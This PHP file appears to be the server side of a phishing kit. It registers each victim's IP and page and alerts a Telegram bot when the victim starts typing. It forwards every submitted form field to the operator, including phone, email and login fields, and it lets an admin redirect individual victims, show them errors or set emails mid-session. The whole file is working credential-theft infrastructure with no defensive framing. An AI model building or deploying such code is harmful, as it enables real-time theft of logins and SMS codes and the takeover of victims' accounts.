<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

require_once 'config.php';

$DATA_FILE = __DIR__ . '/data/clients.json';
$CMD_FILE  = __DIR__ . '/data/commands.json';

function ensureDir() {
    if (!is_dir(__DIR__ . '/data')) {
        mkdir(__DIR__ . '/data', 0777, true);
    }
}

function readJson($file) {
    if (!file_exists($file)) return [];
    $data = file_get_contents($file);
    return json_decode($data, true) ?: [];
}

function writeJson($file, $data) {
    ensureDir();
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}

function sendTelegram($message) {
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    if ($TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;

    $url = "https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage";
    $post = [
        'chat_id' => $TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

function generateId() {
    return strtoupper(substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, 8));
}

function getIp() {
    $headers = ['HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $h) {
        if (!empty($_SERVER[$h])) return $_SERVER[$h];
    }
    return 'unknown';
}

$action = $_GET['action'] ?? '';
$method = $_SERVER['REQUEST_METHOD'];

// ==================== REGISTER ====================
if ($action === 'register' && $method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $ip = getIp();
    $clients = readJson($DATA_FILE);
    $clientId = generateId();

    $clients[$clientId] = [
        'id' => $clientId,
        'ip' => $ip,
        'page' => $input['page'] ?? 'unknown',
        'status' => 'online',
        'phone' => '',
        'email' => '',
        'data' => [],
        'lastActive' => time(),
        'connected' => time()
    ];

    writeJson($DATA_FILE, $clients);

    sendTelegram("🟢 <b>New Client</b>
🆔 ID: <code>{$clientId}</code>
🌐 IP: {$ip}
📄 Page: " . ($input['page'] ?? 'unknown'));

    echo json_encode(['success' => true, 'clientId' => $clientId]);
    exit;
}

// ==================== HEARTBEAT ====================
if ($action === 'heartbeat' && $method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $clientId = $input['clientId'] ?? '';

    $clients = readJson($DATA_FILE);
    if (isset($clients[$clientId])) {
        $clients[$clientId]['status'] = 'online';
        $clients[$clientId]['lastActive'] = time();
        if (isset($input['page'])) {
            $clients[$clientId]['page'] = $input['page'];
        }
        writeJson($DATA_FILE, $clients);
    }

    // Get commands for this client
    $commands = readJson($CMD_FILE);
    $clientCommands = [];
    if (isset($commands[$clientId])) {
        $clientCommands = $commands[$clientId];
        unset($commands[$clientId]);
        writeJson($CMD_FILE, $commands);
    }

    echo json_encode(['success' => true, 'commands' => $clientCommands]);
    exit;
}

// ==================== TYPING ====================
if ($action === 'typing' && $method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $clientId = $input['clientId'] ?? '';
    $page = $input['page'] ?? 'unknown';

    $clients = readJson($DATA_FILE);
    if (isset($clients[$clientId])) {
        $clients[$clientId]['lastActive'] = time();
        writeJson($DATA_FILE, $clients);

        sendTelegram("⌨️ <b>Typing</b>
🆔 <code>{$clientId}</code>
🌐 {$clients[$clientId]['ip']}
📄 {$page}
📝 Client started typing");
    }

    echo json_encode(['success' => true]);
    exit;
}

// ==================== DATA ====================
if ($action === 'data' && $method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $clientId = $input['clientId'] ?? '';
    $data = $input['data'] ?? [];

    $clients = readJson($DATA_FILE);
    if (isset($clients[$clientId])) {
        $clients[$clientId]['data'] = array_merge($clients[$clientId]['data'], $data);
        if (isset($data['phone'])) $clients[$clientId]['phone'] = $data['phone'];
        if (isset($data['email'])) $clients[$clientId]['email'] = $data['email'];
        // Also save from login-phone-number-input field
        if (isset($data['login-phone-number-input'])) {
            $clients[$clientId]['phone'] = $data['login-phone-number-input'];
        }
        $clients[$clientId]['lastActive'] = time();
        writeJson($DATA_FILE, $clients);

        $msg = "📥 <b>Data</b>
🆔 <code>{$clientId}</code>
🌐 {$clients[$clientId]['ip']}
📄 {$clients[$clientId]['page']}";
        foreach ($data as $k => $v) {
            $msg .= "
🔹 {$k}: <code>{$v}</code>";
        }
        sendTelegram($msg);
    }

    echo json_encode(['success' => true]);
    exit;
}

// ==================== GET PHONE (for SMS page) ====================
if ($action === 'getphone' && $method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $clientId = $input['clientId'] ?? '';

    $clients = readJson($DATA_FILE);
    if (isset($clients[$clientId])) {
        $phone = $clients[$clientId]['phone'] ?? '';
        echo json_encode(['success' => true, 'phone' => $phone]);
    } else {
        echo json_encode(['success' => false, 'phone' => '']);
    }
    exit;
}

// ==================== ADMIN: GET CLIENTS ====================
if ($action === 'clients' && $method === 'GET') {
    $clients = readJson($DATA_FILE);
    $now = time();
    foreach ($clients as &$c) {
        if ($now - $c['lastActive'] > 40) {
            $c['status'] = 'offline';
        }
    }
    writeJson($DATA_FILE, $clients);

    echo json_encode(['success' => true, 'clients' => array_values($clients)]);
    exit;
}

// ==================== ADMIN: REDIRECT ONE ====================
if ($action === 'redirect' && $method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $clientId = $input['clientId'] ?? '';
    $target = $input['target'] ?? '';

    $commands = readJson($CMD_FILE);
    if (!isset($commands[$clientId])) $commands[$clientId] = [];
    $commands[$clientId][] = ['type' => 'redirect', 'target' => $target];
    writeJson($CMD_FILE, $commands);

    echo json_encode(['success' => true]);
    exit;
}

// ==================== ADMIN: ERROR ONE ====================
if ($action === 'error' && $method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $clientId = $input['clientId'] ?? '';

    $commands = readJson($CMD_FILE);
    if (!isset($commands[$clientId])) $commands[$clientId] = [];
    $commands[$clientId][] = ['type' => 'showError'];
    writeJson($CMD_FILE, $commands);

    echo json_encode(['success' => true]);
    exit;
}

// ==================== ADMIN: SET EMAIL ONE ====================
if ($action === 'setemail' && $method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $clientId = $input['clientId'] ?? '';
    $email = $input['email'] ?? '';

    $commands = readJson($CMD_FILE);
    if (!isset($commands[$clientId])) $commands[$clientId] = [];
    $commands[$clientId][] = ['type' => 'setEmail', 'email' => $email];
    writeJson($CMD_FILE, $commands);

    echo json_encode(['success' => true]);
    exit;
}

echo json_encode(['success' => false, 'error' => 'Invalid action']);